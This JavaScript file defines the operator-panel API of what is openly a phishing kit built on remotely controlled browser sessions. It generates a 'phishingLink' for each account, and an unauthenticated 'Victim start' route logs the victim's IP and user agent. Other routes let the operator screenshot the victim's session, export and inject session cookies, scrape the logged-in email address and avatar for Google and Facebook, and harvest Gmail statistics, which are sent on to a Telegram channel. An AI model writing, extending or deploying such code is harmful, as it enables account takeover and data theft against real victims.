// Panel API routes: browser-session control.

import { loadAccounts, getAccount, getAccountByRef, saveAccount, deleteAccount } from '../accounts.js';
import * as browser from '../browser.js';
import { config } from '../config.js';
import { isLocked, lockoutRemainingMs, recordFailure, recordSuccess } from '../pinGuard.js';
import { createSession, validateSession, deleteSession } from '../session.js';
import { verifyUser } from '../userdb.js';
import { collectGmailStats, formatStatsForTelegram } from '../gmail-stats.js';
import { isConfigured as gmailApiConfigured, hasToken as hasGmailToken, revokeToken as revokeGmailToken } from '../gmail-api.js';
import * as telegram from '../telegram.js';

function sessionToken(req) {
  const m = (req.headers.cookie || '').match(/(?:^|;\s*)__sp_s=([0-9a-f]{64})/);
  return m ? m[1] : null;
}

function cookieSet(token, maxAge = 86400) {
  return `__sp_s=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${maxAge}`;
}

// Returns false and sends 401 if not authenticated; otherwise returns true.
function checkAuth(req, reply) {
  if (isLocked(req.ip)) {
    reply.code(429).send({ error: 'too_many_attempts', retryAfterMs: lockoutRemainingMs(req.ip) });
    return false;
  }
  const token = sessionToken(req);
  if (token && validateSession(token)) {
    recordSuccess(req.ip);
    return true;
  }
  recordFailure(req.ip);
  reply.code(401).send({ error: 'unauthorized' });
  return false;
}

export default async function panelRoutes(app) {
  // ── Security headers ──────────────────────────────────────────────────────
  app.addHook('onSend', (_req, reply, _payload, done) => {
    reply.header('X-Frame-Options', 'DENY');
    reply.header('X-Content-Type-Options', 'nosniff');
    reply.header('Referrer-Policy', 'no-referrer');
    reply.header('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    const ct = String(reply.getHeader('content-type') || '');
    if (ct.includes('text/html')) {
      reply.header('Content-Security-Policy', [
        "default-src 'self'",
        "script-src 'self'",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: blob:",
        "connect-src 'self' wss: ws:",
        "media-src blob:",
        "frame-ancestors 'none'",
        "base-uri 'self'",
        "form-action 'self'",
      ].join('; '));
    }
    done();
  });

  // ── CORS ──────────────────────────────────────────────────────────────────
  app.addHook('onRequest', (req, reply, done) => {
    if (!req.url?.startsWith('/api/')) { done(); return; }
    const origin = req.headers.origin;
    if (!origin) { done(); return; }
    const host = req.headers['x-forwarded-host'] || req.headers.host || '';
    const proto = req.headers['x-forwarded-proto'] || 'http';
    if (origin !== `${proto}://${host}`) {
      reply.code(403).send({ error: 'forbidden_origin' });
      return;
    }
    done();
  });

  // ── Auth ──────────────────────────────────────────────────────────────────
  app.post('/api/auth', async (req, reply) => {
    if (isLocked(req.ip)) {
      return reply.code(429).send({ error: 'too_many_attempts', retryAfterMs: lockoutRemainingMs(req.ip) });
    }
    const body = req.body || {};
    if (typeof body.username !== 'string' || typeof body.password !== 'string') {
      return reply.code(400).send({ error: 'username_and_password_required' });
    }
    // verifyUser runs constant-time comparison; always returns null on failure
    const user = await verifyUser(body.username, body.password).catch(() => null);
    if (!user) {
      recordFailure(req.ip);
      const ms = lockoutRemainingMs(req.ip);
      // Generic error — no username enumeration
      return reply.code(401).send({ error: 'invalid_credentials', ...(ms ? { retryAfterMs: ms } : {}) });
    }
    recordSuccess(req.ip);
    const token = createSession(user.username);
    return reply.header('Set-Cookie', cookieSet(token)).send({ ok: true });
  });

  app.post('/api/logout', async (req, reply) => {
    const token = sessionToken(req);
    deleteSession(token);
    return reply.header('Set-Cookie', cookieSet('deleted', 0)).send({ ok: true });
  });

  app.get('/api/accounts', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const accounts = await loadAccounts();
    return accounts.map((a) => ({ ...a, ...browser.status(a.id) }));
  });

  app.get('/api/logs', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const since = Number(req.query?.since) || 0;
    return browser.getLogs(since);
  });

  app.post('/api/accounts', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const { id, label, startUrl, proxyUrl } = req.body || {};
    if (!id || !label || !startUrl)
      return reply.code(400).send({ error: 'id, label and startUrl are required' });
    if (!/^[a-z0-9_-]+$/.test(id))
      return reply.code(400).send({ error: 'id must be lowercase letters, digits, _ or -' });
    const existed = Boolean(await getAccount(id));
    if (!existed) {
      await browser.stop(id).catch(() => {});
      const wiped = await browser.wipeProfile(id);
      if (wiped) console.log('[panel] wiped leftover profile for new account:', id);
    }
    let proxyFields = {};
    if (proxyUrl) {
      const m = String(proxyUrl).trim().match(/^(https?|socks[45]?):\/\/(?:([^:@]+):([^@]+)@)?([^:@\s]+):(\d{1,5})$/i);
      if (!m) return reply.code(400).send({ error: 'invalid_proxy_url' });
      proxyFields = {
        proxyServer: `${m[1].toLowerCase()}://${m[4]}:${m[5]}`,
        proxyUsername: m[2] || '',
        proxyPassword: m[3] || '',
        useProxy: true,
      };
    } else {
      const isGoogle = /(^|\.)google\.com$/.test(new URL(startUrl).hostname);
      if (isGoogle) proxyFields = { useProxy: false };
    }
    await saveAccount({ id, label, startUrl, ...proxyFields });
    await browser.start(id, req.ip).catch(() => {});
    const saved = await getAccount(id);
    const ref = saved?.ref || '';
    const publicHost = config.publicHost || (req.headers['x-forwarded-host'] || req.headers.host || 'localhost');
    const proto = req.headers['x-forwarded-proto'] || 'https';
    const phishingLink = ref ? `${proto}://${publicHost}/account/login?ref=${ref}` : '';
    return { ok: true, id, phishingLink };
  });

  app.delete('/api/accounts/:id', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const { id } = req.params;
    if (!await getAccount(id)) return reply.code(404).send({ error: 'unknown_account' });
    await browser.stop(id).catch(() => {});
    await deleteAccount(id);
    await browser.wipeProfile(id);
    return { ok: true };
  });

  app.post('/api/accounts/:id/reset-profile', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const { id } = req.params;
    if (!await getAccount(id)) return reply.code(404).send({ error: 'unknown_account' });
    await browser.stop(id).catch(() => {});
    const wiped = await browser.wipeProfile(id);
    await browser.start(id, req.ip).catch(() => {});
    return { ok: true, wiped };
  });

  app.post('/api/accounts/:id/start', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    return browser.start(req.params.id, req.ip);
  });

  app.post('/api/accounts/:id/stop', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    return browser.stop(req.params.id);
  });

  app.patch('/api/accounts/:id', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const acc = await getAccount(req.params.id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    const { notes, password, email } = req.body || {};
    await saveAccount({ ...acc, notes, password, email });
    return { ok: true };
  });

  app.get('/api/accounts/:id/status', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    return browser.status(req.params.id);
  });

  app.get('/api/accounts/:id/screenshot', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    const page = browser.getPage(req.params.id);
    if (!page) return reply.code(409).send({ error: 'session_not_running' });
    const buf = await page.screenshot({ type: 'jpeg', quality: 70, timeout: 8000 });
    reply.header('content-type', 'image/jpeg');
    return reply.send(buf);
  });

  app.get('/api/accounts/:id/cookies', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const acc = await getAccount(req.params.id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    const ctx = browser.getContext(req.params.id);
    if (!ctx) return reply.code(409).send({ error: 'session_not_running' });
    const cookies = await ctx.cookies();
    reply.header('content-type', 'application/json');
    reply.header('content-disposition', `attachment; filename="${req.params.id}-cookies.json"`);
    return reply.send(JSON.stringify(cookies, null, 2));
  });

  app.post('/api/accounts/:id/cookies', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const acc = await getAccount(req.params.id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    const ctx = browser.getContext(req.params.id);
    if (!ctx) return reply.code(409).send({ error: 'session_not_running' });
    const cookies = req.body;
    if (!Array.isArray(cookies)) return reply.code(400).send({ error: 'expected a JSON array of cookies' });
    await ctx.addCookies(cookies);
    const page = browser.getPage(req.params.id);
    if (page) await page.goto(acc.startUrl, { waitUntil: 'commit' }).catch(() => {});
    return { ok: true, count: cookies.length };
  });

  const withTimeout = (promise, ms = 5000) =>
    Promise.race([promise, new Promise((resolve) => setTimeout(() => resolve(null), ms))]);

  app.get('/api/accounts/:id/info', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    if (!await getAccount(req.params.id)) return reply.code(404).send({ error: 'unknown_account' });
    const page = browser.getPage(req.params.id);
    if (!page) return { running: false };
    const url = page.url();
    const [title, loginHint, avatarUrl, userAgent, ip] = await Promise.all([
      withTimeout(page.title().catch(() => '')),
      withTimeout(page.evaluate(() => {
        const gEl = document.querySelector('[aria-label*="@"]');
        if (gEl) {
          const m = gEl.getAttribute('aria-label').match(/[\w.+-]+@[\w.-]+\.\w+/);
          if (m) return m[0];
        }
        const fbEl = document.querySelector('[aria-label="Twój profil"]') ||
                     document.querySelector('[aria-label="Your profile"]');
        if (fbEl) return fbEl.getAttribute('aria-label');
        const og = document.querySelector('meta[property="og:title"]');
        if (og) return og.content;
        return null;
      }).catch(() => null)),
      withTimeout(page.evaluate(() => {
        const el = document.querySelector('img[alt*="profile" i], img[alt*="avatar" i], img[alt*="zdjęcie" i]');
        return el ? el.src : null;
      }).catch(() => null)),
      withTimeout(page.evaluate(() => navigator.userAgent).catch(() => null), 3000),
      withTimeout(page.evaluate(() => {
        const tryFetch = (url, extract) => {
          const ctrl = new AbortController();
          const t = setTimeout(() => ctrl.abort(), 3000);
          return fetch(url, { signal: ctrl.signal })
            .then((r) => r.ok ? r.json() : null)
            .then(extract)
            .catch(() => null)
            .finally(() => clearTimeout(t));
        };
        return tryFetch('https://api.ipify.org?format=json', d => d?.ip)
          .then(ip => ip || tryFetch('https://api.myip.com', d => d?.ip))
          .then(ip => ip || tryFetch('https://ipinfo.io/json', d => d?.ip));
      }).catch(() => null), 8000),
    ]);
    const blocked = (title ?? '') === '' && loginHint === null && userAgent === null;
    return { running: true, title: title ?? '', url, loginHint, avatarUrl, userAgent, ip, blocked };
  });

  app.get('/adduser', async (req, reply) => reply.sendFile('adduser.html'));
  app.get('/login', async (req, reply) => reply.sendFile('login.html'));

  app.get('/account/login', async (req, reply) => {
    const ref = req.query?.ref || '';
    if (!ref || !await getAccountByRef(ref)) return reply.code(404).send({ error: 'unknown_ref' });
    return reply.sendFile('view.html');
  });

  // Victim start — no auth required (ref is the access credential)
  app.post('/api/account-by-ref/:ref/start', async (req, reply) => {
    const acc = await getAccountByRef(req.params.ref);
    if (!acc) return reply.code(404).send({ error: 'unknown_ref' });
    const victimIp = req.ip;
    const victimUa = req.headers['user-agent'] || '';
    if (!acc.victimIp || !acc.victimUa) {
      await saveAccount({ ...acc, victimIp, victimUa, victimFirstSeen: Date.now() });
    }
    await browser.start(acc.id, req.ip);
    return { accountId: acc.id, ref: req.params.ref };
  });

  app.get('/api/accounts/:id/mail-stats', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const acc = await getAccount(req.params.id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    const ctx = browser.getContext(req.params.id);
    if (!ctx) return reply.code(409).send({ error: 'session_not_running' });
    const stats = await collectGmailStats(ctx, null, req.params.id);
    return stats;
  });

  app.get('/api/accounts/:id/mail-stats/progress', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const { id } = req.params;
    reply.raw.writeHead(200, {
      'content-type': 'text/event-stream',
      'cache-control': 'no-cache',
      'connection': 'keep-alive',
    });
    const send = (msg) => reply.raw.write(`data: ${JSON.stringify(msg)}\n\n`);
    const acc = await getAccount(id);
    if (!acc) { send({ done: true, error: 'unknown_account' }); reply.raw.end(); return; }
    const ctx = browser.getContext(id);
    if (!ctx) { send({ done: true, error: 'session_not_running' }); reply.raw.end(); return; }
    try {
      const stats = await collectGmailStats(ctx, (msg) => send({ step: msg }), id);
      send({ done: true, stats });
      const tgText = formatStatsForTelegram(acc.label, stats);
      telegram.sendMessage(tgText, { parseMode: 'HTML' }).catch(() => {});
    } catch (err) {
      send({ done: true, error: String(err?.message || err) });
    }
    reply.raw.end();
  });

  app.get('/api/accounts/:id/gmail-api-status', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const { id } = req.params;
    const acc = await getAccount(id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    return { configured: gmailApiConfigured(), authorized: await hasGmailToken(id) };
  });

  app.post('/api/accounts/:id/gmail-api-revoke', async (req, reply) => {
    if (checkAuth(req, reply) === false) return;
    const { id } = req.params;
    const acc = await getAccount(id);
    if (!acc) return reply.code(404).send({ error: 'unknown_account' });
    await revokeGmailToken(id);
    return { ok: true };
  });
}
